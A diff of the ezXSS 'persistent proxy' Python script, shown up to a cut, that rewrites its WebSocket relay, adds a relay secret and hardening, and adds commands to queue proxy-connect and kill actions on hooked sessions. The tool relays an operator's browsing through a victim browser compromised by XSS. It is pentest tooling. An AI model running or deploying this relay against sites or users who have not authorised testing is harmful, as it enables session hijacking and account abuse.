@@ -1,15 +1,21 @@
 #!/usr/bin/env python3
-import os
+import argparse
 import asyncio
-import ssl
-import websockets
-from urllib.parse import urlsplit
-import json
 import base64
-from dotenv import load_dotenv
-import uuid
-import gzip
+import hashlib
+import hmac
+import json
 import logging
+import os
+import ssl
+import struct
+import sys
+import urllib.error
+import urllib.parse
+import urllib.request
+import uuid
+import zlib
+from urllib.parse import urlsplit
 
 """
 The ezXSS persistent proxy is a reverse proxy that can only be used in combination with a ezXSS installation.
@@ -18,445 +24,680 @@ This feature enables easy and secure testing of persistent XSS vulnerabilities o
 For additional information and support, please visit the ezXSS wiki on GitHub at https://github.com/ssl/ezXSS/wiki
 """
 
-print("""
-                              ████     █████  █████████      █████████      
-                              ██████ ███████ ████   █████  █████   █████  
-  ███████████  ██████████████   ██████████   ████          █████            
- ████     ████       ██████       ██████      ██████████     ██████████     ezProxy v2.0
+BANNER = """
+                              ████     █████  █████████      █████████
+                              ██████ ███████ ████   █████  █████   █████
+  ███████████  ██████████████   ██████████   ████          █████
+ ████     ████       ██████       ██████      ██████████     ██████████     ezProxy v3.0
  █████████████     ██████       ██████████            ████           ████   github.com/ssl/ezXSS
- ████            ███████      ██████ ███████ ████     ████ █████     ████   
+ ████            ███████      ██████ ███████ ████     ████ █████     ████
    ██████████  ██████████████ ████     █████  ███████████    ██████████     made with <3
-""")
+"""
 
+WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
 
-# Settings
-load_dotenv()
-host = os.getenv("prHost")
-websockets_port = os.getenv("prWebPort")
-proxy_port = os.getenv("prProxyPort")
-use_login = True if os.getenv("prUseLogin") == '1' or os.getenv("prUseLogin") == 'true' else False
-username = os.getenv("prUser")
-password = os.getenv("prPassword")
-cert_file = os.getenv("prCertFile")
-cert_key = os.getenv("prKeyFile")
-
-# Configure logging
-log_level = os.getenv("prLogLevel", "WARNING").upper()
-log_levels = {
-    "DEBUG": logging.DEBUG,
-    "INFO": logging.INFO, 
-    "WARNING": logging.WARNING,
-    "ERROR": logging.ERROR,
-    "CRITICAL": logging.CRITICAL
-}
-logging.basicConfig(level=log_levels.get(log_level, logging.WARNING), format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
-
-# Configuration constants
 MAX_MESSAGE_SIZE = 10 * 1024 * 1024
+MAX_REQUEST_HEADER_SIZE = 64 * 1024
 REQUEST_TIMEOUT = 30
-MAX_RETRIES = 3
-COMPRESSION_THRESHOLD = 1024
+HANDSHAKE_TIMEOUT = 15
 
-# SSL context
-try:
-    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    ssl_context.load_cert_chain(cert_file, keyfile=cert_key)
+logger = logging.getLogger("ezproxy")
 
-    from cryptography import x509
-    from cryptography.hazmat.backends import default_backend
-    with open(cert_file, "rb") as cert_file_stream:
-        cert_data = cert_file_stream.read()
-        certificate = x509.load_pem_x509_certificate(cert_data, default_backend())
-        hostname = None
-        for attribute in certificate.subject:
-            if attribute.oid == x509.NameOID.COMMON_NAME:
-                hostname = attribute.value
-                break
-    if hostname == None:
-        raise Exception('Could not find hostname from certificate')
-except Exception as e:
-    print(f"Error while loading SSL cert: {e}")
-    exit()
-
-# Global state
 connected_clients = {}
 passed_origins = {}
 pending_requests = {}
+pending_by_client = {}
 
-# Websockets receiving message
-async def echo(websocket, path=None):
+
+class WebSocketError(Exception):
+    pass
+
+
+class WebSocketConnection:
+    OP_CONT = 0x0
+    OP_TEXT = 0x1
+    OP_BIN = 0x2
+    OP_CLOSE = 0x8
+    OP_PING = 0x9
+    OP_PONG = 0xA
+
+    def __init__(self, reader, writer):
+        self.reader = reader
+        self.writer = writer
+        self._send_lock = asyncio.Lock()
+        self.closed = False
+
+    @property
+    def peer(self):
+        try:
+            return self.writer.get_extra_info("peername")
+        except Exception:
+            return None
+
+    async def handshake(self):
+        raw = await self.reader.readuntil(b"\r\n\r\n")
+        lines = raw.decode("iso-8859-1").split("\r\n")
+
+        headers = {}
+        for line in lines[1:]:
+            if ":" in line:
+                name, value = line.split(":", 1)
+                headers[name.strip().lower()] = value.strip()
+
+        key = headers.get("sec-websocket-key")
+        upgrade = headers.get("upgrade", "").lower()
+        if upgrade != "websocket" or not key:
+            self.writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n")
+            await self.writer.drain()
+            raise WebSocketError("not a WebSocket upgrade request")
+
+        accept = base64.b64encode(
+            hashlib.sha1((key + WS_GUID).encode("ascii")).digest()
+        ).decode("ascii")
+
+        response = (
+            "HTTP/1.1 101 Switching Protocols\r\n"
+            "Upgrade: websocket\r\n"
+            "Connection: Upgrade\r\n"
+            "Sec-WebSocket-Accept: " + accept + "\r\n\r\n"
+        )
+        self.writer.write(response.encode("ascii"))
+        await self.writer.drain()
+
+    async def _read_exact(self, n):
+        return await self.reader.readexactly(n)
+
+    async def _read_frame(self):
+        header = await self._read_exact(2)
+        b0, b1 = header[0], header[1]
+        fin = (b0 & 0x80) != 0
+        opcode = b0 & 0x0F
+        masked = (b1 & 0x80) != 0
+        length = b1 & 0x7F
+
+        if (opcode & 0x08) and (not fin or length > 125):
+            raise WebSocketError("invalid control frame")
+
+        if length == 126:
+            length = struct.unpack("!H", await self._read_exact(2))[0]
+        elif length == 127:
+            length = struct.unpack("!Q", await self._read_exact(8))[0]
+
+        if length > MAX_MESSAGE_SIZE:
+            raise WebSocketError("frame exceeds MAX_MESSAGE_SIZE")
+
+        if not masked:
+            raise WebSocketError("received unmasked frame from client")
+
+        mask = await self._read_exact(4)
+        data = await self._read_exact(length) if length else b""
+
+        if data:
+            data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
+
+        return fin, opcode, data
+
+    async def recv(self):
+        chunks = []
+        total = 0
+        msg_opcode = None
+        while True:
+            fin, opcode, data = await self._read_frame()
+
+            if opcode == self.OP_CLOSE:
+                await self.close()
+                raise WebSocketError("connection closed by peer")
+            if opcode == self.OP_PING:
+                await self._send(self.OP_PONG, data)
+                continue
+            if opcode == self.OP_PONG:
+                continue
+
+            if opcode in (self.OP_TEXT, self.OP_BIN):
+                msg_opcode = opcode
+            elif opcode == self.OP_CONT:
+                pass
+            else:
+                raise WebSocketError("unexpected opcode %s" % opcode)
+
+            chunks.append(data)
+            total += len(data)
+            if total > MAX_MESSAGE_SIZE:
+                raise WebSocketError("message exceeds MAX_MESSAGE_SIZE")
+
+            if fin:
+                break
+
+        payload = b"".join(chunks)
+        if msg_opcode == self.OP_TEXT:
+            return payload.decode("utf-8", "replace")
+        return payload
+
+    async def _send(self, opcode, data):
+        if isinstance(data, str):
+            data = data.encode("utf-8")
+        length = len(data)
+        header = bytearray()
+        header.append(0x80 | opcode)
+        if length < 126:
+            header.append(length)
+        elif length < (1 << 16):
+            header.append(126)
+            header += struct.pack("!H", length)
+        else:
+            header.append(127)
+            header += struct.pack("!Q", length)
+
+        async with self._send_lock:
+            self.writer.write(bytes(header) + data)
+            await self.writer.drain()
+
+    async def send(self, text):
+        await self._send(self.OP_TEXT, text)
+
+    async def close(self):
+        if self.closed:
+            return
+        self.closed = True
+        try:
+            await self._send(self.OP_CLOSE, b"")
+        except Exception:
+            pass
+        try:
+            self.writer.close()
+            await self.writer.wait_closed()
+        except Exception:
+            pass
+
+
+async def handle_websocket(reader, writer, cfg=None):
+    ws = WebSocketConnection(reader, writer)
     client_id = None
+    relay_secret = ""
+    if cfg is not None:
+        relay_secret = getattr(cfg, "relay_secret", "") or ""
     try:
-        async for message in websocket:
+        await asyncio.wait_for(ws.handshake(), timeout=HANDSHAKE_TIMEOUT)
+    except Exception as exc:
+        logger.debug("WebSocket handshake failed: %s", exc)
+        try:
+            writer.close()
+        except Exception:
+            pass
+        return
+
+    try:
+        while True:
+            try:
+                message = await ws.recv()
+            except WebSocketError:
+                break
+
             try:
                 data = json.loads(message)
-            except json.JSONDecodeError as e:
-                logger.error(f"Failed to parse JSON message: {e}")
+            except json.JSONDecodeError as exc:
+                logger.error("Failed to parse JSON message: %s", exc)
                 continue
 
             if client_id is None:
-                client_id = data.get('clientid', '').lower()
+                if relay_secret:
+                    presented = str(data.get("secret") or "")
+                    if not hmac.compare_digest(presented, relay_secret):
+                        logger.warning("Relay handshake rejected: missing/invalid secret")
+                        break
+
+                client_id = (data.get("clientid") or "").lower()
                 if not client_id:
                     logger.error("No client ID provided in initial message")
                     continue
-                
-                # Handle reconnection - close old connection if exists
+
                 if client_id in connected_clients:
-                    old_websocket = connected_clients[client_id]
-                    logger.info(f"Client {client_id} reconnecting - closing old connection")
-                    try:
-                        await old_websocket.close()
-                    except:
-                        pass
-                    
-                    # Clean up old pending requests for this client
-                    old_requests = [req_id for req_id in pending_requests.keys() 
-                                  if req_id.startswith(f"{client_id}_")]
-                    for req_id in old_requests:
-                        pending_requests.pop(req_id, None)
-                    
-                    if old_requests:
-                        logger.info(f"Cleaned up {len(old_requests)} pending requests for reconnecting client {client_id}")
-                    
-                connected_clients[client_id] = websocket
+                    old = connected_clients[client_id]
+                    logger.info("Client %s reconnecting - closing old connection", client_id)
+                    await old.close()
+                    _purge_pending(client_id)
 
-                print(f"\n[!] Client connected with client ID: {client_id}")
-                print(f"[!] Origin: {data.get('origin', 'unknown')}")
+                connected_clients[client_id] = ws
+                print("\n[!] Client connected with client ID: %s" % client_id)
+                print("[!] Origin: %s" % data.get("origin", "unknown"))
 
-                if data.get('pass') == True:
-                    origin = data.get('origin')
+                if str(data.get("pass", "")).lower() in ("true", "1", "yes", "on"):
+                    origin = data.get("origin")
                     if origin:
-                        print(f"[>] Accessible on http://{client_id}.ezxss and http://{origin}")
-                        passed_origins[origin] = client_id
-                else:
-                    print(f'[>] Accessible on http://{client_id}.ezxss')
-            else:
-                # Handle response from client
-                if "body" in data:
-                    # Check if client is still connected
-                    if client_id not in connected_clients:
-                        logger.debug(f"Ignoring response from disconnected client {client_id}")
-                        continue
-                    
-                    request_uri = data.get("request_uri", "unknown")
-                    request_id = data.get("request_id")
-                    status_code = data.get("statusCode", "unknown")
-                    body_length = len(data.get("body", ""))
-                    
-                    logger.info(f"📨 Response from client {client_id}: {request_uri} (status: {status_code}, {body_length} chars)")
-                    
-                    # Handle response using request ID system
-                    if request_id:
-                        if request_id in pending_requests:
-                            await pending_requests[request_id].put(message)
-                            logger.info(f"Response queued for request_id: {request_id}")
+                        held = passed_origins.get(origin)
+                        if held and held != client_id and held in connected_clients:
+                            logger.warning(
+                                "Refusing to remap live origin %s (held by %s)", origin, held
+                            )
+                            print("[>] Accessible on http://%s.ezxss" % client_id)
                         else:
-                            logger.warning(f"Received response for unknown request_id: {request_id}")
-                    else:
-                        logger.warning(f"Response missing request_id from client {client_id} for {request_uri}")
+                            print("[>] Accessible on http://%s.ezxss and http://%s" % (client_id, origin))
+                            passed_origins[origin] = client_id
                 else:
-                    logger.debug(f"Non-response message from client {client_id}: {data.get('type', 'unknown')}")
-                    
-    except websockets.exceptions.ConnectionClosed:
-        logger.info(f"Client {client_id} disconnected")
-    except Exception as e:
-        logger.error(f"Error in websocket handler for client {client_id}: {e}")
+                    print("[>] Accessible on http://%s.ezxss" % client_id)
+            else:
+                if "body" in data:
+                    if client_id not in connected_clients:
+                        logger.debug("Ignoring response from disconnected client %s", client_id)
+                        continue
+                    request_id = data.get("request_id")
+                    if request_id and request_id in pending_requests:
+                        await pending_requests[request_id].put(message)
+                        logger.info("Response queued for request_id: %s", request_id)
+                    elif request_id:
+                        logger.warning("Response for unknown request_id: %s", request_id)
+                    else:
+                        logger.warning("Response missing request_id from client %s", client_id)
+                else:
+                    logger.debug("Non-response message from client %s: %s", client_id, data.get("type", "unknown"))
+    except Exception as exc:
+        logger.error("Error in websocket handler for client %s: %s", client_id, exc)
     finally:
+        await ws.close()
         if client_id is not None:
-            # Clean up connected client
-            if client_id in connected_clients:
+            if connected_clients.get(client_id) is ws:
                 connected_clients.pop(client_id, None)
-                logger.debug(f"Removed client {client_id} from connected_clients")
-            
-            # Clean up any pending requests for this client
-            old_requests = [req_id for req_id in pending_requests.keys() 
-                          if req_id.startswith(f"{client_id}_")]
-            for req_id in old_requests:
-                pending_requests.pop(req_id, None)
-            
-            # Clean up passed origins
-            origins_to_remove = [origin for origin, cid in passed_origins.items() if cid == client_id]
-            for origin in origins_to_remove:
+            _purge_pending(client_id)
+            for origin in [o for o, cid in passed_origins.items() if cid == client_id]:
                 passed_origins.pop(origin, None)
-                logger.debug(f"Cleaned up passed origin: {origin}")
-            
-            if old_requests or origins_to_remove:
-                logger.info(f"Cleaned up {len(old_requests)} pending requests and {len(origins_to_remove)} origins for client {client_id}")
 
-# Compress response data
-def compress_response(data):
-    if isinstance(data, str):
-        data = data.encode('utf-8')
-    
-    if len(data) > COMPRESSION_THRESHOLD:
+
+def _purge_pending(client_id):
+    for req_id in pending_by_client.pop(client_id, set()):
+        pending_requests.pop(req_id, None)
+
+
+def _basic_auth_token(username, password):
+    return base64.b64encode(("%s:%s" % (username, password)).encode("utf-8")).decode("utf-8")
+
+
+def _is_textual(content_type):
+    ct = str(content_type or "").lower()
+    if not ct:
+        return True
+    if ct.startswith("text/"):
+        return True
+    return any(token in ct for token in
+               ("html", "json", "javascript", "ecmascript", "xml", "css", "svg"))
+
+
+async def _read_request_head(reader):
+    buf = bytearray()
+    while True:
+        crlf = buf.find(b"\r\n\r\n")
+        lf = buf.find(b"\n\n")
+        if crlf != -1 and (lf == -1 or crlf <= lf):
+            return bytes(buf[:crlf]), bytes(buf[crlf + 4:])
+        if lf != -1:
+            return bytes(buf[:lf]), bytes(buf[lf + 2:])
+        if len(buf) > MAX_REQUEST_HEADER_SIZE:
+            raise WebSocketError("request headers exceed MAX_REQUEST_HEADER_SIZE")
+        chunk = await reader.read(4096)
+        if not chunk:
+            return None, b""
+        buf += chunk
+
+
+def _parse_content_length(head_lines):
+    for line in head_lines[1:]:
+        if ":" not in line:
+            continue
+        name, value = line.split(":", 1)
+        if name.strip().lower() == "content-length":
+            try:
+                return int(value.strip())
+            except ValueError:
+                return None
+    return None
+
+
+async def handle_proxy(reader, writer, cfg):
+    try:
         try:
-            compressed = gzip.compress(data)
-            if len(compressed) < len(data):
-                return base64.b64encode(compressed).decode('utf-8'), True
-        except Exception as e:
-            logger.warning(f"Failed to compress response: {e}")
-    
-    return base64.b64encode(data).decode('utf-8'), False
+            request_head, leftover = await asyncio.wait_for(
+                _read_request_head(reader), timeout=HANDSHAKE_TIMEOUT
+            )
+        except asyncio.TimeoutError:
+            return
+        except WebSocketError:
+            logger.warning("Request headers exceed the read buffer limit")
+            return
+        if request_head is None:
+            return
 
-# Decompress response data
-def decompress_response(data, is_compressed):
-    try:
-        decoded = base64.b64decode(data)
-        if is_compressed:
-            return gzip.decompress(decoded)
-        return decoded
-    except Exception as e:
-        logger.error(f"Failed to decompress response: {e}")
-        return data.encode('utf-8') if isinstance(data, str) else data
+        head_lines = request_head.decode("ISO-8859-1").splitlines()
+        if not head_lines or not head_lines[0]:
+            return
 
-# Proxy server receives new request
-async def handle_connection(reader, writer):
-    try:
-        writer.get_extra_info('socket')
-        request = ''.join((line + '\n') for line in (await reader.read(32768)).decode("ISO-8859-1").splitlines())
-        if '\n\n' in request:
-            request_head, request_body = request.split('\n\n', 1)
+        parts = head_lines[0].split(" ")
+        if len(parts) < 2:
+            return
+        request_method, request_uri = parts[0], parts[1]
+
+        content_length = _parse_content_length(head_lines)
+        if content_length is not None and (content_length < 0 or content_length > MAX_MESSAGE_SIZE):
+            logger.warning("Rejecting request with invalid Content-Length %s", content_length)
+            return
+
+        if content_length is None:
+            request_body = leftover
+        elif content_length <= len(leftover):
+            request_body = leftover[:content_length]
         else:
-            request_head, request_body = request, ''
-        request_head = request_head.splitlines()
-        
-        if not request_head:
-            return
-            
-        request_headline = request_head[0]
-        request_parts = request_headline.split(' ')
-        if len(request_parts) < 2:
-            return
-            
-        request_method, request_uri = request_parts[0], request_parts[1]
+            try:
+                request_body = leftover + await asyncio.wait_for(
+                    reader.readexactly(content_length - len(leftover)), timeout=REQUEST_TIMEOUT
+                )
+            except asyncio.IncompleteReadError as exc:
+                request_body = leftover + exc.partial
+            except asyncio.TimeoutError:
+                logger.warning("Timed out reading request body (%s bytes expected)", content_length)
+                return
 
-        parsed_uri = urlsplit(request_uri)
-        domain = parsed_uri.netloc
-        status_code, content_type = 200, "text/html; encoding=utf8"
+        parsed = urlsplit(request_uri)
+        domain = parsed.netloc
+        content_type = "text/html; charset=utf-8"
         response_headers = {}
-        
-        do_proxy = False
-        response_body = 'You can not browse the internet while on the ezXSS proxy.'.encode('utf-8')
+        response_body = b"You can not browse the internet while on the ezXSS proxy."
 
-        # Check for the Authorization header
-        if use_login:
-            auth_encoded = base64.b64encode(f'{username}:{password}'.encode('utf-8')).decode('utf-8')
-            auth_header = [header for header in request_head if header.lower().startswith('authorization')]
-            if not auth_header or f'Basic {auth_encoded}' != auth_header[0].split(' ', 1)[1]:
-                response_head = 'HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm="Proxy"\r\n\r\n'
-                writer.write(response_head.encode('utf-8'))
+        if cfg.use_login:
+            expected = "Basic " + _basic_auth_token(cfg.username, cfg.password)
+            auth = [h for h in head_lines if h.lower().startswith("authorization")]
+            got = auth[0].split(" ", 1)[1].strip() if (auth and " " in auth[0]) else ""
+            if not auth or not hmac.compare_digest(got, expected):
+                writer.write(b'HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm="Proxy"\r\n\r\n')
                 writer.write(response_body)
                 await writer.drain()
                 return
 
         client_id = None
-        if domain.endswith('.ezxss'):
+        do_proxy = False
+        if domain.endswith(".ezxss"):
             client_id = domain[:-6]
             do_proxy = True
         elif domain in passed_origins:
             client_id = passed_origins[domain]
             do_proxy = True
-        
-        if do_proxy and client_id:
-            full_uri = parsed_uri.path + ('?' + parsed_uri.query if parsed_uri.query else '')
-            logger.info(f"Browser request: {request_method} {full_uri} (client: {client_id})")
-            
-            if client_id in connected_clients:
-                # Generate unique request ID
-                request_id = f"{client_id}_{uuid.uuid4().hex}"
-                request_queue = asyncio.Queue()
-                pending_requests[request_id] = request_queue
-                
-                try:
-                    # Send request to client with unique ID
-                    message = json.dumps({
-                        "method": request_method, 
-                        "request_uri": full_uri, 
-                        "postData": request_body,
-                        "request_id": request_id
-                    })
-                    
-                    logger.info(f"Sending to WebSocket: {request_method} {full_uri} (ID: {request_id})")
-                    await connected_clients[client_id].send(message)
-                    
-                    # Small delay to let the message be processed
-                    await asyncio.sleep(0.1)
-                    
-                    # Wait for response with retries
-                    client_response = None
-                    response_received = False
-                    
-                    for attempt in range(MAX_RETRIES):
-                        try:
-                            system_task = asyncio.create_task(request_queue.get())
-                            
-                            done, pending_tasks = await asyncio.wait(
-                                [system_task],
-                                timeout=REQUEST_TIMEOUT,
-                                return_when=asyncio.FIRST_COMPLETED
-                            )
-                            
-                            # Cancel pending tasks
-                            for task in pending_tasks:
-                                task.cancel()
-                                try:
-                                    await task
-                                except asyncio.CancelledError:
-                                    pass
-                            
-                            if done:
-                                msg = await list(done)[0]
-                                data = json.loads(msg)
-                                
-                                if 'body' in data:
-                                    status_code = data.get('statusCode', 200)
-                                    
-                                    # Handle compressed responses
-                                    body_data = data['body']
-                                    is_compressed = data.get('compressed', False)
-                                    
-                                    try:
-                                        if is_compressed:
-                                            client_response = decompress_response(body_data, True)
-                                        else:
-                                            client_response = base64.b64decode(body_data)
-                                    except Exception as e:
-                                        logger.warning(f"Failed to decode response body for {full_uri}: {e}")
-                                        # Try treating as plain text
-                                        try:
-                                            client_response = body_data.encode('utf-8') if isinstance(body_data, str) else body_data
-                                        except:
-                                            client_response = b"Error decoding response"
-                                    
-                                    content_type = data.get('content_type', 'text/html')
-                                    
-                                    # Extract headers from client response
-                                    if 'headers' in data and isinstance(data['headers'], dict):
-                                        response_headers = data['headers']
-                                        if 'content-type' in response_headers:
-                                            content_type = response_headers['content-type']
-                                    
-                                    response_received = True
-                                    logger.info(f"✓ Response received for {full_uri}: {len(client_response)} bytes, status {status_code}")
-                                    break
-                                else:
-                                    logger.warning(f"Response missing body field for {full_uri}")
-                            else:
-                                raise asyncio.TimeoutError("No response received")
-                                
-                        except asyncio.TimeoutError:
-                            logger.warning(f'Attempt {attempt + 1}/{MAX_RETRIES}: Timeout for {full_uri}')
-                            if attempt == MAX_RETRIES - 1:
-                                logger.error(f'All attempts failed for {full_uri}')
-                        except Exception as e:
-                            logger.error(f'Error processing response for {full_uri}: {e}')
-                            break
-                
-                finally:
-                    # Clean up pending request
-                    pending_requests.pop(request_id, None)
 
-                if client_response is not None and response_received:
+        if do_proxy and client_id:
+            full_uri = (parsed.path or "/") + (("?" + parsed.query) if parsed.query else "")
+            logger.info("Browser request: %s %s (client: %s)", request_method, full_uri, client_id)
+
+            if client_id in connected_clients:
+                request_id = "%s_%s" % (client_id, uuid.uuid4().hex)
+                queue = asyncio.Queue()
+                pending_requests[request_id] = queue
+                pending_by_client.setdefault(client_id, set()).add(request_id)
+                client_response = None
+                received = False
+                try:
+                    await connected_clients[client_id].send(json.dumps({
+                        "method": request_method,
+                        "request_uri": full_uri,
+                        "postData": request_body.decode("ISO-8859-1"),
+                        "request_id": request_id,
+                    }))
+
+                    loop = asyncio.get_running_loop()
+                    deadline = loop.time() + REQUEST_TIMEOUT
+                    while not received:
+                        remaining = deadline - loop.time()
+                        if remaining <= 0:
+                            break
+                        try:
+                            msg = await asyncio.wait_for(queue.get(), timeout=remaining)
+                        except asyncio.TimeoutError:
+                            break
+
+                        data = json.loads(msg)
+                        if "body" not in data:
+                            logger.warning("Response missing body for %s", full_uri)
+                            continue
+
+                        body_data = data["body"]
+                        try:
+                            if data.get("compressed", False):
+                                client_response = decompress_response(body_data, True)
+                            else:
+                                client_response = base64.b64decode(body_data)
+                        except Exception as exc:
+                            logger.warning("Failed to decode body for %s: %s", full_uri, exc)
+                            client_response = body_data.encode("utf-8") if isinstance(body_data, str) else body_data
+
+                        content_type = data.get("content_type", "text/html")
+                        if isinstance(data.get("headers"), dict):
+                            response_headers = data["headers"]
+                            if "content-type" in response_headers:
+                                content_type = response_headers["content-type"]
+                        received = True
+                        logger.info(
+                            "Response received for %s (%s bytes, upstream status %s)",
+                            full_uri, len(client_response), data.get("statusCode", 200),
+                        )
+
+                    if not received:
+                        logger.warning("Timeout waiting for response to %s", full_uri)
+                finally:
+                    pending_requests.pop(request_id, None)
+                    reqs = pending_by_client.get(client_id)
+                    if reqs is not None:
+                        reqs.discard(request_id)
+                        if not reqs:
+                            pending_by_client.pop(client_id, None)
+
+                if received and client_response is not None:
                     response_body = client_response
                 else:
-                    error_msg = f'No response received for {full_uri} after {MAX_RETRIES} attempts'
-                    logger.error(error_msg)
-                    response_body = error_msg.encode('utf-8')
-                    status_code = 504
+                    response_body = ("No response received for %s within %s seconds" % (full_uri, REQUEST_TIMEOUT)).encode("utf-8")
             else:
-                error_msg = f'No connected client found with client ID "{client_id}"'
-                logger.error(error_msg)
-                response_body = error_msg.encode('utf-8')
-                status_code = 502
-        
-        # Replace https:// with http:// in response content
-        if isinstance(response_body, bytes):
-            response_body = response_body.replace(b'https://', b'http://')
-        elif isinstance(response_body, str):
-            response_body = response_body.replace('https://', 'http://').encode('utf-8')
-        
-        # Build response headers
-        response_head_parts = [f'HTTP/1.1 {status_code} OK']
-        
-        # Add headers from client response
-        for header_name, header_value in response_headers.items():
-            if header_name.lower() not in ['content-length', 'content-encoding']:
-                response_head_parts.append(f'{header_name}: {header_value}')
-        
-        response_head_parts.append(f'Content-Length: {len(response_body)}')
-        
-        if not any(header.lower().startswith('content-type:') for header in response_head_parts[1:]):
-            response_head_parts.append(f'Content-Type: {content_type}')
-        
-        response_head = '\r\n'.join(response_head_parts) + '\r\n\r\n'
-        writer.write(response_head.encode('utf-8'))
+                response_body = ('No connected client found with client ID "%s"' % client_id).encode("utf-8")
+
+        if not isinstance(response_body, bytes):
+            response_body = str(response_body).encode("utf-8")
+
+        if _is_textual(content_type):
+            response_body = response_body.replace(b"https://", b"http://")
+
+        def _no_crlf(v):
+            return str(v).replace("\r", "").replace("\n", "")
+
+        hop_by_hop = (
+            "content-length", "content-encoding", "transfer-encoding",
+            "connection", "keep-alive", "proxy-authenticate",
+            "proxy-authorization", "te", "trailer", "upgrade",
+        )
+        head = ["HTTP/1.1 200 OK"]
+        for name, value in response_headers.items():
+            if str(name).lower() in hop_by_hop:
+                continue
+            head.append("%s: %s" % (_no_crlf(name), _no_crlf(value)))
+        head.append("Content-Length: %s" % len(response_body))
+        head.append("Connection: close")
+        if not any(h.lower().startswith("content-type:") for h in head[1:]):
+            head.append("Content-Type: %s" % _no_crlf(content_type))
+
+        writer.write(("\r\n".join(head) + "\r\n\r\n").encode("utf-8"))
         writer.write(response_body)
         await writer.drain()
-        
-    except Exception as e:
-        logger.error(f"Error while processing request: {e}")
+    except Exception as exc:
+        logger.error("Error while processing request: %s", exc)
     finally:
         try:
             writer.close()
             await writer.wait_closed()
-        except:
+        except Exception:
             pass
 
 
-# Async server
-class AsyncServer:
-    def __init__(self, server):
-        self.server = server
+def decompress_response(data, is_compressed):
+    decoded = base64.b64decode(data)
+    if not is_compressed:
+        return decoded
+    d = zlib.decompressobj(32 + zlib.MAX_WBITS)
+    out = d.decompress(decoded, MAX_MESSAGE_SIZE + 1)
+    if len(out) > MAX_MESSAGE_SIZE or d.unconsumed_tail:
+        raise WebSocketError("decompressed response exceeds MAX_MESSAGE_SIZE")
+    return out + d.flush()
 
-    async def __aenter__(self):
-        return self.server
 
-    async def __aexit__(self, exc_type, exc, tb):
-        self.server.close()
+def _api_request(cfg, method, path, body=None):
+    if not cfg.api_url or not cfg.api_token:
+        raise SystemExit("EZXSS_API_URL and EZXSS_API_TOKEN (or --api-url/--api-token) are required for this command")
 
-
-# Run proxy server
-async def run_proxy_server():
+    url = cfg.api_url.rstrip("/") + path
+    data = json.dumps(body).encode("utf-8") if body is not None else None
+    req = urllib.request.Request(url, data=data, method=method)
+    req.add_header("Authorization", "Bearer " + cfg.api_token)
+    req.add_header("Content-Type", "application/json")
     try:
-        server = await asyncio.start_server(handle_connection, host, proxy_port)
-    except:
-        print('Error in starting proxy server')
-        exit()
-    print(f'[#] Proxy running on {hostname}:{proxy_port}')
+        with urllib.request.urlopen(req, timeout=REQUEST_TIMEOUT) as resp:
+            payload = resp.read().decode("utf-8")
+    except urllib.error.HTTPError as exc:
+        detail = exc.read().decode("utf-8", "replace")
+        raise SystemExit("API %s %s -> HTTP %s: %s" % (method, path, exc.code, detail))
+    except urllib.error.URLError as exc:
+        raise SystemExit("API %s %s -> %s" % (method, path, exc))
 
-    async with AsyncServer(server) as server:
-        await asyncio.gather(server.wait_closed())
+    try:
+        return json.loads(payload)
+    except json.JSONDecodeError:
+        raise SystemExit("API returned non-JSON: %s" % payload)
 
 
-# Run websockets server
-async def run_websockets_server():
-    await websockets.serve(
-        echo, 
-        host, 
-        websockets_port, 
-        ssl=ssl_context,
-        max_size=MAX_MESSAGE_SIZE,
-        ping_interval=20,
-        ping_timeout=10,
-        close_timeout=10
+def _resolve_session_id(cfg, client_id):
+    result = _api_request(cfg, "GET", "/api/sessions?client_id=" + urllib.parse.quote(client_id))
+    rows = result.get("data") or []
+    if not rows:
+        raise SystemExit('No session found for client id "%s"' % client_id)
+    return int(rows[0]["id"])
+
+
+def cmd_connect(cfg):
+    session_id = _resolve_session_id(cfg, cfg.client)
+    body = {"ipport": cfg.ipport, "passorigin": cfg.passorigin, "autoreconnect": cfg.autoreconnect}
+    result = _api_request(cfg, "POST", "/api/console/proxy/%d" % session_id, body)
+    data = result.get("data") or {}
+    print(data.get("message") or "Proxy connect command queued for %s" % cfg.client)
+
+
+def cmd_kill(cfg):
+    session_id = _resolve_session_id(cfg, cfg.client)
+    _api_request(cfg, "POST", "/api/console/kill/%d" % session_id, {})
+    print("Kill (ez_stop) command queued for %s" % cfg.client)
+
+
+async def run_serve(cfg):
+    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    try:
+        ssl_context.load_cert_chain(cfg.cert, keyfile=cfg.key)
+    except Exception as exc:
+        raise SystemExit("Error while loading SSL cert: %s" % exc)
+
+    ws_server = await asyncio.start_server(
+        lambda r, w: handle_websocket(r, w, cfg), cfg.host, cfg.ws_port, ssl=ssl_context
     )
-    print(f'[#] Websockets running on {hostname}:{websockets_port}')
+    proxy_server = await asyncio.start_server(lambda r, w: handle_proxy(r, w, cfg), cfg.host, cfg.proxy_port)
+
+    print("[#] WebSocket (wss) running on %s:%s" % (cfg.hostname, cfg.ws_port))
+    print("[#] HTTP proxy running on %s:%s" % (cfg.hostname, cfg.proxy_port))
+    print("")
+
+    async with ws_server, proxy_server:
+        await asyncio.gather(ws_server.serve_forever(), proxy_server.serve_forever())
 
 
-# Gather both servers
-async def main():
-    websockets_server = asyncio.ensure_future(run_websockets_server())
-    proxy_server = asyncio.ensure_future(run_proxy_server())
-    print('')
-    await asyncio.gather(websockets_server, proxy_server)
-
-
-# Start loop
-if __name__ == '__main__':
-    loop = asyncio.get_event_loop()
+def cmd_serve(cfg):
     try:
-        loop.run_until_complete(main())
-    finally:
-        loop.close()
+        asyncio.run(run_serve(cfg))
+    except KeyboardInterrupt:
+        print("\n[#] Shutting down")
 
+
+def _env(name, default=None):
+    value = os.getenv(name)
+    return value if value not in (None, "") else default
+
+
+def _env_bool(name):
+    return _env(name) in ("1", "true", "True", "yes", "on")
+
+
+def _env_int(name, default):
+    value = _env(name)
+    if value is None:
+        return default
+    try:
+        return int(value)
+    except ValueError:
+        raise SystemExit("%s must be an integer (got %r)" % (name, value))
+
+
+def build_parser():
